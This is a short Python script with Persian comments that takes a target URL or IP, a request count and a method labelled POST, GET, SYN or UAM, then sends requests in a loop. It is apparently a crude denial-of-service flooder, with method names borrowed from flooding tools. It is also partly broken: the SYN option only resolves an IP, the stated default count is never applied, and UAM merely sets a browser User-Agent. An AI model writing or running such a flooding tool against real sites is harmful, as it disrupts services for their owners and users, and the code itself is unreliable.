
import requests
import socket

def send_request(url, method="GET"):
    if method == "POST":
        data = {"key": "value"}  # اطلاعات برای بدنه درخواست POST را تهیه کنید
        response = requests.post(url, data=data)
    elif method == "GET":
        response = requests.get(url)
    elif method == "SYN":
        ip = socket.gethostbyname(url)
        print("Ip AddReSs ", ip)
        return
    elif method == "UAM":
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}  # یک User-Agent مناسب تهیه کنید
        response = requests.get(url, headers=headers)

    print(response.text)  # پاسخ سرور را بررسی کنید

# تعداد ریکوئست را از کاربر دریافت می کنیم
num_requests = int(input(" Enter count of Requests (def=10000): "))
url = input(" Enter target url or ip: ")
method = input(" Enter the method (POST/GET/SYN/UAM): ")

# ریکوئست ها را ارسال می کنیم
for i in range(num_requests):
    send_request(url, method)
